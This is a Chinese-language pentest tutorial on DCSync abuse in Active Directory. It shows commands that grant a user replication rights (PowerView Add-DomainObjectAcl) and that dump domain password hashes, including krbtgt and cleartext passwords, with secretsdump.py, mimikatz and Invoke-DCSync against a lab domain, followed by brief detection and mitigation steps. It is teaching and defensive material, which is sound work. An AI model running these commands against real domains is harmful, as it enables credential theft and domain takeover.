---
title: DCSync 滥用
published: 2024-10-06
description: "DCSync域控数据同步复制滥用"
image: ""
tags: ["Domain", "Windows", "Pentest"]
category: Windows
draft: false
---
# 概览

[DCSync 介绍](#dcsync-介绍)

[修改DCSync ACL](#修改dcsync-acl)

[DCSync 攻击](#dcsync-攻击)

[DCSync 防御](#dcsync-防御)

# DCSync 介绍

DCSync 通过[Directory Replication Service(目录复制服务)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/06205d97-30da-4fdc-a276-3fd831b272e0)的GetNCChanges接口向域控发起数据同步请求，获取指定域控上的活动目录数据。目录复制服务是一种用于在活动目录中复制和管理数据的RPC协议，协议由drsuapi和dsaop。

## 修改DCSync ACL

windows中**administrators组，domain admins组，Enterprise admins组**拥有DCSync权限，使用以下命令查询域内拥有DCSync权限的用户

```bash
AdFind.exe -s subtree -b "DC=xie,DC=com" -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;"Replicating Directory Chan
 ges";; -recmute
```

DCSync权限涉及三个ACE：

- [Replicating Directory Changes All](https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes-all)：复制域内敏感数据的访问控制权限，Rights-GUID为1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
- [DS-Replication-Get-Changes](https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes)：复制指定域或其他目录分区的访问控制权限，Rights-GUID为1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
- Replicating Directory Changes In Filtered Set：允许 Active Directory 复制特定对象的更改，而不是整个目录。Rights-GUID为89e95b76-444d-4c62-991a-0facbeda640c

可以通过域控给予指定用户DCSync权限，依次打开**Active Directory用户和计算机->查看->高级功能->**，找到域控xie.com，右键打开属性->安全->高级->添加->选择主体，指定一个用户hack，确认后下方勾选**复制目录更改**和**复制目录更改所有项**，最后应用即可

可以看到hack用户已经具有了DCSync权限
```bash
AdFind.exe -s subtree -b "DC=xie,DC=com" -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;"Replicating Directory Chan
ges";;XIE\hack -recmute

#Using server: WIN-HSTT0ETJU78.xie.com:389
#Directory: Windows Server 2012 R2

#dn:DC=xie,DC=com
#>nTSecurityDescriptor: [DACL] OBJ ALLOW;[CONT INHERIT];[CTL];Replicating Directory Changes;;XIE\hack
#>nTSecurityDescriptor: [DACL] OBJ ALLOW;[CONT INHERIT];[CTL];Replicating Directory Changes All;;XIE\hack

...
```

也可以用powershell脚本[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)赋予用户DCSync权限

```bash
Import-Module .\PowerView.ps1
Add-DomainObjectAcl -TargetIdentity "DC=xie,DC=com" -PrincipalIdentity hack -Rights DCSync -Verbose
```

# DCSync 攻击

如果获取了凭据的用户拥有DCSync权限，就可以用工具导出域用户的hash

```bash
python secretsdump.py xie/hack:'Abcd@1234'@10.0.0.133 -just-dc
```

```bash
mimikatz.exe "lsadump::dcsync /domain:xie.com /user:test /csv" "exit"
mimikatz.exe "lsadump::dcsync /domain:xie.com /all /csv" "exit"
```

[Invoke-DCSync](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-DCSync.ps1),[ft(Format Table)](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/format-table?view=powershell-7.4)
```bash
Import-Module .\Invoke-DCSync.ps1
Invoke-DCSync -DumpForest | ft -wrap -autosize
Invoke-DCSync -DumpForest -User @{"krbtgt"} | ft -wrap -autosize
```

:::tip

当用户属性中勾选了**使用可逆加密存储密码**，当用户再次修改密码时，secretsdump.py将能导出明文密码

:::

```shell
python secretsdump.py xie/hack:'Abcd@1234'@10.0.0.133 -just-dc-user User1

#[*] ClearText passwords grabbed
#xie.com\User1:CLEARTEXT:Abcd!1234
```

# DCSync 防御

- 配置网络安全设备过滤流量
- 设置白名单，指定ip的域控能够进行目录复制
- 检测DCSync 滥用
> 1. 通过网络设备监控来自白名单外的ip的域控数据同步请求
> 2. 使用[ACLight](https://github.com/cyberark/ACLight.git)来检测域内具有DCSync权限的用户，在Result文件夹的**Privileged Accounts - Irregular Accounts.csv**查看是否有DCSync权限用户
>```bash
>.\Execute-ACLight2.bat
>```
> 3. 检测出来后移除该权限即可
>```
>Import-Module PowerView.ps1
>Remove-DomainObjectAcl -TargetIdentity "DC=xie,DC=com" -PrincipalIdentity hack -Rights DCSync
>```


